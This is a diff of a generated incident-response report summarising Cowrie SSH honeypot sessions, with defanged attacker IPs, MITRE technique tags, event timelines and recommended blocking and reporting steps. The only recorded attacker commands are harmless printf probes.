+| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_66fe0b39b036636691cfe961fefeaecc_small_control'"'"' '"'"'check_66fe0b39b036636691cfe961fefeaecc'"'"'', printf '\n%s|%s\n' 'check_66fe0b39b036636691cfe961fefeaecc_small_control' 'check_66fe0b39b036636691cfe961fefeaecc', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_66fe0b39b036636691cfe961fefeaecc_small_math'"'"' "$((445*892+80))"', (445*892+80, printf '\n%s|%s\n' 'check_66fe0b39b036636691cfe961fefeaecc_small_math' ")"` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |
 
 **Attack Timeline:**
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-11-19 01:03:01` | `cowrie.session.connect` |
-| `2026-11-19 01:03:01` | `cowrie.client.version` |
-| `2026-11-19 01:03:01` | `cowrie.client.kex` |
-| `2026-11-19 01:03:02` | `cowrie.login.success` |
-| `2026-11-19 01:03:03` | `cowrie.session.params` |
-| `2026-11-19 01:03:03` | `cowrie.command.input` |
-| `2026-11-19 01:03:03` | `cowrie.command.failed` |
-| `2026-11-19 01:03:03` | `cowrie.log.closed` |
-| `2026-11-19 01:03:04` | `cowrie.session.params` |
-| `2026-11-19 01:03:04` | `cowrie.command.input` |
-| `2026-11-19 01:03:04` | `cowrie.session.file_download` |
-| `2026-11-19 01:03:04` | `cowrie.log.closed` |
-| `2026-11-19 01:03:13` | `cowrie.session.closed` |
+| `2026-11-19 04:36:33` | `cowrie.session.connect` |
+| `2026-11-19 04:36:34` | `cowrie.client.version` |
+| `2026-11-19 04:36:34` | `cowrie.client.kex` |
+| `2026-11-19 04:36:37` | `cowrie.login.success` |
+| `2026-11-19 04:36:39` | `cowrie.client.size` |
+| `2026-11-19 04:36:40` | `cowrie.session.params` |
+| `2026-11-19 04:36:41` | `cowrie.command.input` |
+| `2026-11-19 04:36:41` | `cowrie.command.input` |
+| `2026-11-19 04:36:41` | `cowrie.command.input` |
+| `2026-11-19 04:36:41` | `cowrie.command.input` |
+| `2026-11-19 04:36:41` | `cowrie.command.input` |
+| `2026-11-19 04:36:41` | `cowrie.command.input` |
+| `2026-11-19 04:36:41` | `cowrie.command.input` |
+| `2026-11-19 04:36:41` | `cowrie.command.input` |
+| `2026-11-19 04:36:41` | `cowrie.command.input` |
+| … | _47 more event(s) — see ir_cases.json_ |
 
 **Recommended Actions:**
-- [ ] Submit `219.79.17[.]110` to AbuseIPDB if not already reported
-- [ ] Block `219.79.17[.]110` at perimeter firewall / security group
+- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
+- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-2af9fa321f30
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `219.79.17[.]110` |
-| **First Seen** | 2026-11-19 01:03 |
-| **Last Seen** | 2026-11-19 01:03 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 01:03:05` | `cowrie.session.connect` |
-| `2026-11-19 01:03:05` | `cowrie.client.version` |
-| `2026-11-19 01:03:05` | `cowrie.client.kex` |
-| `2026-11-19 01:03:06` | `cowrie.login.success` |
-| `2026-11-19 01:03:06` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `219.79.17[.]110` to AbuseIPDB if not already reported
-- [ ] Block `219.79.17[.]110` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### Additional priority cases (29) — compact view
+### Additional priority cases (266) — compact view
 
 | Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
 |---|---|---|---|---|---|---|---|
-| IR-0f3b2a6416c0 | HIGH | `176.53.159[.]196` | 2026-11-19 01:03 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-95f0d0d2e1ac | HIGH | `45.148.10[.]61` | 2026-11-19 01:14 | Y | 1 | 0 | `T1078 · T1592` |
-| IR-078722e60b4e | HIGH | `45.156.87[.]189` | 2026-11-19 01:22 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-e2bdf2d12239 | HIGH | `113.249.121[.]140` | 2026-11-19 01:23 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
-| IR-6f1e229ceba7 | HIGH | `113.249.121[.]140` | 2026-11-19 01:27 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-2521d21526d5 | HIGH | `45.135.194[.]92` | 2026-11-19 01:31 | Y | 0 | 0 | `T1078` |
-| IR-e4512a48fc4e | HIGH | `120.27.109[.]232` | 2026-11-19 01:32 | Y | 1 | 0 | `T1078 · T1592` |
-| IR-76c275893a8d | HIGH | `179.184.242[.]48` | 2026-11-19 01:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
-| IR-e819cd233494 | HIGH | `179.184.242[.]48` | 2026-11-19 01:36 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-53800649a079 | HIGH | `154.92.15[.]197` | 2026-11-19 01:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
-| IR-2152f9865745 | HIGH | `154.92.15[.]197` | 2026-11-19 01:43 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-46ab658eed5d | HIGH | `115.190.151[.]242` | 2026-11-19 01:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
-| IR-555bd6c66663 | HIGH | `93.152.221[.]108` | 2026-11-19 01:48 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-ff58152fdfa3 | HIGH | `45.148.10[.]61` | 2026-11-19 02:00 | Y | 1 | 0 | `T1078 · T1592` |
-| IR-2701a2c3faa1 | HIGH | `103.78.1[.]160` | 2026-11-19 02:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
-| IR-0ab746d89ef6 | HIGH | `103.78.1[.]160` | 2026-11-19 02:03 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-5c90fa22baf6 | HIGH | `93.152.221[.]51` | 2026-11-19 02:08 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-941b8317b67c | HIGH | `202.165.26[.]170` | 2026-11-19 02:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
-| IR-f6ebe469ea88 | HIGH | `202.165.26[.]170` | 2026-11-19 02:10 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-f7136650292d | HIGH | `195.178.110[.]78` | 2026-11-19 02:16 | Y | 0 | 0 | `T1078` |
-| IR-aae1563f5fc1 | HIGH | `193.32.162[.]15` | 2026-11-19 02:21 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-a5061aa0b50e | HIGH | `35.210.172[.]21` | 2026-11-19 02:28 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-614efcd1f5b3 | HIGH | `45.156.87[.]189` | 2026-11-19 02:36 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-91234117ea5a | HIGH | `138.226.239[.]233` | 2026-11-19 02:46 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-d5cf8806ca68 | HIGH | `78.128.112[.]74` | 2026-11-19 02:46 | Y | 1 | 0 | `T1078 · T1592` |
-| IR-2cf60ad3453b | HIGH | `138.226.239[.]234` | 2026-11-19 02:48 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-35a80bde2d42 | HIGH | `80.94.95[.]118` | 2026-11-19 02:49 | Y | 0 | 0 | `T1078 · T1592` |
-| IR-26b944d3b81b | HIGH | `77.239.124[.]252` | 2026-11-19 02:50 | Y | 0 | 0 | `T1078` |
-| IR-24340d8b8108 | MEDIUM | `109.160.32[.]176` | 2026-11-19 00:00 | N | 1 | 0 | `` |
+| IR-fa7306670ccd | HIGH | `80.94.92[.]179` | 2026-11-19 04:38 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-d23e179b104b | HIGH | `80.94.92[.]179` | 2026-11-19 04:40 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-05411af1cec7 | HIGH | `45.148.10[.]61` | 2026-11-19 04:41 | Y | 1 | 0 | `T1078 · T1592` |
+| IR-6689a87d721b | HIGH | `80.94.92[.]179` | 2026-11-19 04:43 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-e9f932026ac0 | HIGH | `193.187.110[.]160` | 2026-11-19 04:44 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-daad9263640a | HIGH | `35.214.204[.]44` | 2026-11-19 04:45 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-e2d31ad4291c | HIGH | `185.227.144[.]174` | 2026-11-19 04:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
+| IR-5a40f826e138 | HIGH | `176.53.159[.]196` | 2026-11-19 04:45 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-22660d81f379 | HIGH | `185.227.144[.]174` | 2026-11-19 04:45 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-37df954faa10 | HIGH | `80.94.92[.]179` | 2026-11-19 04:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-fa15fb7e0e8d | HIGH | `34.1.227[.]164` | 2026-11-19 04:45 | Y | 3 | 0 | `T1078` |
+| IR-d12777e1740e | HIGH | `80.94.92[.]179` | 2026-11-19 04:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-a95815362226 | HIGH | `36.156.22[.]2` | 2026-11-19 04:48 | Y | 0 | 0 | `T1078` |
+| IR-2f4d57734002 | HIGH | `65.49.1[.]152` | 2026-11-19 04:49 | Y | 3 | 0 | `T1078` |
+| IR-ad14869f4c60 | HIGH | `80.94.92[.]179` | 2026-11-19 04:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-d6ba42310db6 | HIGH | `93.152.221[.]51` | 2026-11-19 04:50 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-408090d7fe69 | HIGH | `195.178.110[.]78` | 2026-11-19 04:51 | Y | 0 | 0 | `T1078` |
+| IR-2e23c9d4dcc9 | HIGH | `138.226.239[.]233` | 2026-11-19 04:51 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-4c98e04a558c | HIGH | `80.94.95[.]118` | 2026-11-19 04:53 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-b188ffc35b32 | HIGH | `77.90.185[.]29` | 2026-11-19 04:53 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-f903af049934 | HIGH | `45.156.87[.]189` | 2026-11-19 04:55 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-6a92a676c73c | HIGH | `117.247.193[.]27` | 2026-11-19 04:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
+| IR-22570c3f8d0c | HIGH | `117.247.193[.]27` | 2026-11-19 04:56 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-71df6b5c9c24 | HIGH | `103.241.43[.]193` | 2026-11-19 04:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
+| IR-d5cff4311330 | HIGH | `103.241.43[.]193` | 2026-11-19 04:58 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-0b95c52e914c | HIGH | `125.161.90[.]178` | 2026-11-19 05:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
+| IR-f3ce31c08c35 | HIGH | `125.161.90[.]178` | 2026-11-19 05:00 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-1bf9f177b10a | HIGH | `35.214.145[.]207` | 2026-11-19 05:10 | Y | 3 | 0 | `T1078` |
+| IR-6d8efc36534c | HIGH | `68.183.161[.]107` | 2026-11-19 05:11 | Y | 0 | 0 | `T1078` |
+| IR-e262132afe3d | HIGH | `68.183.161[.]107` | 2026-11-19 05:11 | Y | 8 | 0 | `T1078` |
+| IR-cd2f1c54f08c | HIGH | `68.183.161[.]107` | 2026-11-19 05:11 | Y | 40 | 0 | `T1078` |
+| IR-92b182cea00f | HIGH | `130.12.181[.]21` | 2026-11-19 05:17 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-6a90768f84e1 | HIGH | `35.214.230[.]217` | 2026-11-19 05:22 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-3ca387d3721e | HIGH | `36.255.97[.]232` | 2026-11-19 05:33 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-510f12433aa2 | HIGH | `93.152.221[.]108` | 2026-11-19 05:40 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-0fdc79f96e7c | HIGH | `4.221.162[.]168` | 2026-11-19 05:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
+| IR-c7f661cee29b | HIGH | `4.221.162[.]168` | 2026-11-19 05:52 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-4d5cfa759ce1 | HIGH | `210.123.88[.]216` | 2026-11-19 05:55 | Y | 9 | 0 | `T1057 · T1078 · T1083` |
+| IR-a6f0b55f99a7 | HIGH | `160.191.244[.]41` | 2026-11-19 05:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
+| IR-edb73e318a98 | HIGH | `160.191.244[.]41` | 2026-11-19 05:59 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-f2e7e6cd461b | HIGH | `109.160.32[.]111` | 2026-11-19 06:01 | Y | 1 | 0 | `T1078 · T1592` |
+| IR-502470eb84b6 | HIGH | `93.152.221[.]51` | 2026-11-19 06:10 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-4ad56e0c5f4a | HIGH | `176.53.159[.]196` | 2026-11-19 06:10 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-2091a97bd84f | HIGH | `195.178.110[.]78` | 2026-11-19 06:18 | Y | 0 | 0 | `T1078` |
+| IR-c9606b3a3e70 | HIGH | `77.239.124[.]252` | 2026-11-19 06:25 | Y | 0 | 0 | `T1078` |
+| IR-c6d3afb0fc83 | HIGH | `119.96.157[.]188` | 2026-11-19 06:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
+| IR-f4495e032097 | HIGH | `119.96.157[.]188` | 2026-11-19 06:28 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-9159a0aac1bf | HIGH | `130.12.181[.]21` | 2026-11-19 06:30 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-7d7279210fa3 | HIGH | `35.244.32[.]167` | 2026-11-19 06:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
+| IR-b9c85f4aac45 | HIGH | `35.244.32[.]167` | 2026-11-19 06:31 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-a50bf7f9458c | HIGH | `45.135.194[.]92` | 2026-11-19 06:33 | Y | 0 | 0 | `T1078` |
+| IR-d26f800ed9d2 | HIGH | `93.152.221[.]108` | 2026-11-19 06:38 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-b42bfff7b044 | HIGH | `193.32.162[.]15` | 2026-11-19 06:48 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-158f66eb2191 | HIGH | `80.94.95[.]118` | 2026-11-19 06:58 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-f1389de44254 | HIGH | `77.90.185[.]29` | 2026-11-19 06:58 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-eae26a9a23b8 | HIGH | `169.128.70[.]53` | 2026-11-19 07:09 | Y | 4 | 0 | `T1078 · T1083` |
+| IR-b2801ea0d555 | HIGH | `78.128.112[.]74` | 2026-11-19 07:13 | Y | 1 | 0 | `T1078 · T1592` |
+| IR-4540a140d2f6 | HIGH | `45.78.201[.]248` | 2026-11-19 07:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
+| IR-193693e4377d | HIGH | `45.78.201[.]248` | 2026-11-19 07:37 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-20c7afd7853a | HIGH | `160.119.66[.]206` | 2026-11-19 07:41 | Y | 6 | 3 | `T1059.004 · T1078 · T1105` |
+| IR-03810f2ec937 | HIGH | `160.119.66[.]206` | 2026-11-19 07:41 | Y | 1 | 3 | `T1059.004 · T1078 · T1105` |
+| IR-7e2348d3aea5 | HIGH | `51.38.224[.]114` | 2026-11-19 07:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
+| IR-2668d8d0f00e | HIGH | `51.38.224[.]114` | 2026-11-19 07:41 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-89ad2d868d34 | HIGH | `92.118.39[.]77` | 2026-11-19 07:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-4b79b4a1b8cc | HIGH | `92.118.39[.]77` | 2026-11-19 07:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-678812576361 | HIGH | `92.118.39[.]77` | 2026-11-19 07:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-c43a5a206d5e | HIGH | `58.242.64[.]246` | 2026-11-19 07:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
+| IR-5f279ab316f3 | HIGH | `58.242.64[.]246` | 2026-11-19 07:50 | Y | 0 | 0 | `T1078 · T1592` |
+| IR-be448debf2a1 | HIGH | `92.118.39[.]77` | 2026-11-19 07:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-261b15476dd4 | HIGH | `92.118.39[.]77` | 2026-11-19 07:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-c407a292a308 | HIGH | `92.118.39[.]77` | 2026-11-19 07:56 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-f015b58c8b13 | HIGH | `92.118.39[.]77` | 2026-11-19 08:00 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-a99c48889c67 | HIGH | `92.118.39[.]77` | 2026-11-19 08:02 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-82810c95f76d | HIGH | `92.118.39[.]77` | 2026-11-19 08:04 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-15dbf795a98e | HIGH | `92.118.39[.]77` | 2026-11-19 08:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-0ada1ffce791 | HIGH | `92.118.39[.]77` | 2026-11-19 08:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-8bcd76555720 | HIGH | `92.118.39[.]77` | 2026-11-19 08:10 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-a652aee3b32e | HIGH | `92.118.39[.]77` | 2026-11-19 08:12 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-b73fe634f949 | HIGH | `92.118.39[.]77` | 2026-11-19 08:15 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-c7ddb5f88d7a | HIGH | `92.118.39[.]77` | 2026-11-19 08:17 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-5099e4aa852b | HIGH | `92.118.39[.]77` | 2026-11-19 08:19 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-7729f40cd2e3 | HIGH | `92.118.39[.]77` | 2026-11-19 08:21 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-3bb72c1c737c | HIGH | `92.118.39[.]77` | 2026-11-19 08:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-e6af605e2cd5 | HIGH | `92.118.39[.]77` | 2026-11-19 08:25 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-6d41bd584886 | HIGH | `92.118.39[.]77` | 2026-11-19 08:27 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-3184ea5ed61a | HIGH | `92.118.39[.]77` | 2026-11-19 08:29 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-b0c4c424c8d9 | HIGH | `92.118.39[.]77` | 2026-11-19 08:31 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-8402c791b3f2 | HIGH | `92.118.39[.]77` | 2026-11-19 08:33 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-d86f722496b6 | HIGH | `92.118.39[.]77` | 2026-11-19 08:35 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-b80f9cc78ea8 | HIGH | `92.118.39[.]77` | 2026-11-19 08:37 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-00e57f2b8f6d | HIGH | `77.239.124[.]252` | 2026-11-19 08:38 | Y | 0 | 0 | `T1078` |
+| IR-da96084943f6 | HIGH | `92.118.39[.]77` | 2026-11-19 08:39 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-326b9690640f | HIGH | `92.118.39[.]77` | 2026-11-19 08:41 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-1d099e773c3b | HIGH | `92.118.39[.]77` | 2026-11-19 08:43 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-b3f12df0a46d | HIGH | `92.118.39[.]77` | 2026-11-19 08:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-99db692d19f1 | HIGH | `92.118.39[.]77` | 2026-11-19 08:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-be1079f16f4d | HIGH | `92.118.39[.]77` | 2026-11-19 08:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-5e3f3bdfab71 | HIGH | `92.118.39[.]77` | 2026-11-19 08:53 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-4c8a56fdcf89 | HIGH | `92.118.39[.]77` | 2026-11-19 08:55 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
+| IR-8a0e07b6a440 | HIGH | `195.178.110[.]78` | 2026-11-19 08:56 | Y | 0 | 0 | `T1078` |
+_… 166 more priority case(s) in ir_cases.json_
 
 ---
 
@@ -1132,39 +1204,124 @@ Source IPs: `160.119.66.206`
 
 | IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
 |---|---|---|---|---|---|---|---|
-| `113.249.121[.]140` | **2** | 2026-11-19 00:48 | 2026-11-19 02:02 | 4m | 0 | `T1592` | 🟢 LOW |
-| `137.184.169[.]96` | **2** | 2026-11-19 00:31 | 2026-11-19 02:13 | 2m | 0 | `T1592` | 🟢 LOW |
-| `139.19.117[.]129` | **2** | 2026-11-19 00:14 | 2026-11-19 02:14 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
-| `195.178.110[.]78` | **2** | 2026-11-19 00:22 | 2026-11-19 02:16 | 0m | 2 | `T1110.001` | 🟢 LOW |
-| `109.160.32[.]176` | 1 | 2026-11-19 00:10 | 2026-11-19 00:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
-| `118.196.152[.]44` | 1 | 2026-11-19 00:40 | 2026-11-19 00:42 | 120s | 0 | `T1592` | 🟢 LOW |
-| `120.27.109[.]232` | 1 | 2026-11-19 01:32 | 2026-11-19 01:32 | 0s | 0 | `T1592` | 🟢 LOW |
-| `137.184.5[.]188` | 1 | 2026-11-19 00:14 | 2026-11-19 00:16 | 120s | 0 | `T1592` | 🟢 LOW |
-| `172.236.228[.]39` | 1 | 2026-11-19 01:11 | 2026-11-19 01:11 | 0s | 0 | `T1592` | 🟢 LOW |
-| `175.203.243[.]177` | 1 | 2026-11-19 02:50 | 2026-11-19 02:51 | 28s | 0 | `T1592` | 🟢 LOW |
-| `177.38.21[.]245` | 1 | 2026-11-19 00:26 | 2026-11-19 00:27 | 13s | 0 | `T1592` | 🟢 LOW |
-| `18.116.101[.]220` | 1 | 2026-11-19 00:56 | 2026-11-19 00:56 | 0s | 0 | `T1592` | 🟢 LOW |
-| `193.32.162[.]15` | 1 | 2026-11-19 02:21 | 2026-11-19 02:21 | 0s | 0 | `T1592` | 🟢 LOW |
-| `195.96.139[.]120` | 1 | 2026-11-19 01:36 | 2026-11-19 01:36 | 0s | 0 | `T1592` | 🟢 LOW |
-| `216.225.206[.]228` | 1 | 2026-11-19 00:19 | 2026-11-19 00:19 | 1s | 0 | `T1592` | 🟢 LOW |
-| `31.184.195[.]248` | 1 | 2026-11-19 01:12 | 2026-11-19 01:12 | 31s | 0 | `T1592` | 🟢 LOW |
-| `31.43.51[.]236` | 1 | 2026-11-19 00:24 | 2026-11-19 00:24 | 14s | 0 | `T1592` | 🟢 LOW |
-| `35.210.172[.]21` | 1 | 2026-11-19 02:28 | 2026-11-19 02:28 | 3s | 0 | `T1592` | 🟢 LOW |
-| `36.224.42[.]9` | 1 | 2026-11-19 00:55 | 2026-11-19 00:56 | 33s | 0 | `T1592` | 🟢 LOW |
-| `45.148.10[.]61` | 1 | 2026-11-19 01:11 | 2026-11-19 01:11 | 0s | 0 | `T1592` | 🟢 LOW |
-| `52.71.75[.]119` | 1 | 2026-11-19 01:16 | 2026-11-19 01:16 | 1s | 0 | `T1592` | 🟢 LOW |
-| `76.155.131[.]115` | 1 | 2026-11-19 00:51 | 2026-11-19 00:51 | 0s | 0 | `T1592` | 🟢 LOW |
-| `77.239.124[.]132` | 1 | 2026-11-19 01:58 | 2026-11-19 01:58 | 0s | 0 | `T1592` | 🟢 LOW |
-| `77.239.124[.]252` | 1 | 2026-11-19 00:29 | 2026-11-19 00:29 | 1s | 1 | `T1110.001` | 🟢 LOW |
-| `77.239.124[.]252` | 1 | 2026-11-19 02:50 | 2026-11-19 02:50 | 1s | 1 | `T1110.001` | 🟢 LOW |
-| `78.128.112[.]74` | 1 | 2026-11-19 02:46 | 2026-11-19 02:46 | 6s | 0 | `T1592` | 🟢 LOW |
-| `80.94.92[.]234` | 1 | 2026-11-19 00:25 | 2026-11-19 00:25 | 9s | 1 | `T1110.001 · T1592` | 🟢 LOW |
-| `82.147.85[.]98` | 1 | 2026-11-19 00:02 | 2026-11-19 00:02 | 0s | 0 | `T1592` | 🟢 LOW |
-| `93.182.46[.]236` | 1 | 2026-11-19 00:30 | 2026-11-19 00:30 | 12s | 0 | `T1592` | 🟢 LOW |
+| `139.19.117[.]129` | **7** | 2026-11-19 03:16 | 2026-11-19 14:03 | 1m | 12 | `T1110.001 · T1592` | 🟢 LOW |
+| `195.178.110[.]78` | **3** | 2026-11-19 03:54 | 2026-11-19 06:18 | 0m | 3 | `T1110.001` | 🟢 LOW |
+| `109.160.32[.]154` | **2** | 2026-11-19 03:31 | 2026-11-19 05:05 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
+| `137.184.169[.]96` | **2** | 2026-11-19 09:47 | 2026-11-19 10:26 | 2m | 0 | `T1592` | 🟢 LOW |
+| `195.178.110[.]78` | **2** | 2026-11-19 08:56 | 2026-11-19 10:31 | 0m | 2 | `T1110.001` | 🟢 LOW |
+| `195.178.110[.]78` | **2** | 2026-11-19 12:54 | 2026-11-19 14:08 | 0m | 2 | `T1110.001` | 🟢 LOW |
+| `77.239.124[.]132` | **2** | 2026-11-19 05:54 | 2026-11-19 07:44 | 0m | 0 | `T1592` | 🟢 LOW |
+| `77.239.124[.]132` | **2** | 2026-11-19 13:54 | 2026-11-19 15:40 | 0m | 0 | `T1592` | 🟢 LOW |
+| `77.239.124[.]252` | **2** | 2026-11-19 03:17 | 2026-11-19 04:11 | 0m | 2 | `T1110.001` | 🟢 LOW |
+| `77.239.124[.]252` | **2** | 2026-11-19 08:38 | 2026-11-19 10:04 | 0m | 2 | `T1110.001` | 🟢 LOW |
+| `77.239.124[.]252` | **2** | 2026-11-19 15:21 | 2026-11-19 16:22 | 0m | 2 | `T1110.001` | 🟢 LOW |
+| `92.118.39[.]77` | **2** | 2026-11-19 07:58 | 2026-11-19 08:47 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
+| `1.95.73[.]134` | 1 | 2026-11-19 11:15 | 2026-11-19 11:15 | 12s | 0 | `T1592` | 🟢 LOW |
+| `103.203.57[.]11` | 1 | 2026-11-19 13:20 | 2026-11-19 13:20 | 0s | 0 | `T1592` | 🟢 LOW |
+| `103.235.74[.]131` | 1 | 2026-11-19 09:41 | 2026-11-19 09:41 | 0s | 0 | `T1592` | 🟢 LOW |
+| `103.29.70[.]204` | 1 | 2026-11-19 14:01 | 2026-11-19 14:01 | 10s | 0 | `T1592` | 🟢 LOW |
+| `109.160.32[.]111` | 1 | 2026-11-19 06:01 | 2026-11-19 06:01 | 8s | 0 | `T1592` | 🟢 LOW |
+| `111.33.71[.]238` | 1 | 2026-11-19 18:33 | 2026-11-19 18:33 | 0s | 0 | `T1592` | 🟢 LOW |
+| `116.206.193[.]93` | 1 | 2026-11-19 14:36 | 2026-11-19 14:36 | 12s | 0 | `T1592` | 🟢 LOW |
+| `118.121.202[.]149` | 1 | 2026-11-19 09:28 | 2026-11-19 09:30 | 120s | 0 | `T1592` | 🟢 LOW |
+| `120.24.229[.]73` | 1 | 2026-11-19 07:55 | 2026-11-19 07:55 | 1s | 0 | `T1592` | 🟢 LOW |
+| `121.146.212[.]214` | 1 | 2026-11-19 15:15 | 2026-11-19 15:16 | 23s | 0 | `T1592` | 🟢 LOW |
+| `121.158.230[.]8` | 1 | 2026-11-19 05:04 | 2026-11-19 05:05 | 22s | 0 | `T1592` | 🟢 LOW |
+| `131.161.15[.]31` | 1 | 2026-11-19 05:07 | 2026-11-19 05:07 | 32s | 0 | `T1592` | 🟢 LOW |
+| `137.184.169[.]96` | 1 | 2026-11-19 03:28 | 2026-11-19 03:29 | 64s | 0 | `T1592` | 🟢 LOW |
+| `137.184.169[.]96` | 1 | 2026-11-19 06:39 | 2026-11-19 06:40 | 82s | 0 | `T1592` | 🟢 LOW |
